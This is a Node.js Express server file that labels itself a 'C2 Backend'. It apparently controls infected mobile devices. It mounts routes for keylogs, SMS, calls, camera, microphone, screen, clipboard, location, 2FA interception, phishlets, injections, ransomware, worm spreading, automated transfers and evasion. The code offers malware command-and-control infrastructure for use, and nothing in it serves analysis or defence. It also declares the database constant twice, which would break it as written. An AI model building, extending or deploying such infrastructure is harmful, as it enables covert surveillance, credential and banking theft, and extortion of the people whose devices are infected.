const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const compression = require('compression');
const rateLimit = require('express-rate-limit');
const winston = require('winston');
const expressWinston = require('express-winston');
const { createServer } = require('http');
const WebSocket = require('ws');
const dotenv = require('dotenv');
const path = require('path');

dotenv.config();

const app = express();
const server = createServer(app);

const db = require('./utils/db');

async function initDB() {
  try {
    await db.query(`
      CREATE TABLE IF NOT EXISTS users (
        id SERIAL PRIMARY KEY,
        username VARCHAR(255) UNIQUE NOT NULL,
        email VARCHAR(255) UNIQUE NOT NULL,
        password_hash VARCHAR(255) NOT NULL,
        role VARCHAR(50) DEFAULT 'operator',
        is_active BOOLEAN DEFAULT true,
        last_login TIMESTAMP,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      );
    `);
    console.log("Users table verified/created successfully.");
  } catch (err) {
    console.error("Failed to create users table:", err.message);
  }
}

initDB();


// Logger
const logger = winston.createLogger({
  level: 'info',
  format: winston.format.combine(
    winston.format.timestamp(),
    winston.format.json()
  ),
  transports: [
    new winston.transports.Console(),
    new winston.transports.File({ filename: path.join(__dirname, '../logs/error.log'), level: 'error' }),
    new winston.transports.File({ filename: path.join(__dirname, '../logs/combined.log') })
  ]
});

// Middleware
app.use(helmet({
  contentSecurityPolicy: false,
  crossOriginEmbedderPolicy: false
}));
app.use(cors({ origin: '*', credentials: true }));
app.use(compression());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

app.use(expressWinston.logger({
  winstonInstance: logger,
  meta: true,
  msg: 'HTTP {{req.method}} {{req.url}}',
  expressFormat: true,
  colorize: false
}));

const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 1000,
  message: { error: 'Too many requests' }
});
app.use('/api/', limiter);

// Database & Cache
const db = require('./utils/db');
const redis = require('./utils/redis');

// WebSocket Server
const wss = new WebSocket.Server({ server, path: '/ws' });
require('./websocket/handler')(wss, logger);

// MQTT — only init if broker is configured
let mqttClient = null;
if (process.env.MQTT_BROKER_HOST) {
  const mqtt = require('mqtt');
  mqttClient = mqtt.connect(
    `mqtt://${process.env.MQTT_BROKER_HOST}:${process.env.MQTT_BROKER_PORT || 1883}`,
    { reconnectPeriod: 5000 }
  );
  require('./mqtt/handler')(mqttClient, logger);
  logger.info('MQTT client initialized');
} else {
  logger.info('MQTT broker not configured — skipping MQTT init');
}

// MinIO — only init if configured
let minioClient = null;
if (process.env.MINIO_HOST || process.env.MINIO_ENDPOINT) {
  const Minio = require('minio');
  minioClient = new Minio.Client({
    endPoint: process.env.MINIO_HOST || process.env.MINIO_ENDPOINT,
    port: parseInt(process.env.MINIO_PORT || 9000),
    useSSL: process.env.MINIO_USE_SSL === 'true',
    accessKey: process.env.MINIO_ACCESS_KEY,
    secretKey: process.env.MINIO_SECRET_KEY
  });
  require('./minio/handler')(minioClient, logger);
  logger.info('MinIO client initialized');
} else {
  logger.info('MinIO not configured — skipping object storage init');
}

// Routes
app.use('/api/auth', require('./routes/auth'));
app.use('/api/devices', require('./routes/devices'));
app.use('/api/commands', require('./routes/commands'));
app.use('/api/keylogs', require('./routes/keylogs'));
app.use('/api/sms', require('./routes/sms'));
app.use('/api/calls', require('./routes/calls'));
app.use('/api/contacts', require('./routes/contacts'));
app.use('/api/notifications', require('./routes/notifications'));
app.use('/api/clipboard', require('./routes/clipboard'));
app.use('/api/location', require('./routes/location'));
app.use('/api/camera', require('./routes/camera'));
app.use('/api/microphone', require('./routes/microphone'));
app.use('/api/screen', require('./routes/screen'));
app.use('/api/files', require('./routes/files'));
app.use('/api/ransomware', require('./routes/ransomware'));
app.use('/api/injections', require('./routes/injections'));
app.use('/api/phishlets', require('./routes/phishlets'));
app.use('/api/tfa', require('./routes/tfa'));
app.use('/api/apps', require('./routes/apps'));
app.use('/api/processes', require('./routes/processes'));
app.use('/api/network', require('./routes/network'));
app.use('/api/worm', require('./routes/worm'));
app.use('/api/ats', require('./routes/ats'));
app.use('/api/toolkit', require('./routes/toolkit'));
app.use('/api/users', require('./routes/users'));
app.use('/api/dashboard', require('./routes/dashboard'));
app.use('/api/settings', require('./routes/settings'));
app.use('/api/logs', require('./routes/logs'));
app.use('/api/biometrics', require('./routes/biometrics'));
app.use('/api/vnc', require('./routes/vnc'));
app.use('/api/push', require('./routes/push'));
app.use('/api/launch', require('./routes/launch'));
app.use('/api/firewall', require('./routes/firewall'));
app.use('/api/evasion', require('./routes/evasion'));
app.use('/api/hardware', require('./routes/hardware'));

// Health check
app.get('/health', (req, res) => {
  res.json({ 
    status: 'ok', 
    timestamp: new Date().toISOString(),
    services: {
      mqtt: !!mqttClient,
      minio: !!minioClient
    }
  });
});

// Error handler
app.use((err, req, res, next) => {
  logger.error(err.stack);
  res.status(500).json({ error: 'Internal server error' });
});

const PORT = process.env.PORT || 3001;
server.listen(PORT, '0.0.0.0', () => {
  logger.info(`WUZEN C2 Backend running on 0.0.0.0:${PORT}`);
});

module.exports = { app, wss, mqttClient, minioClient };
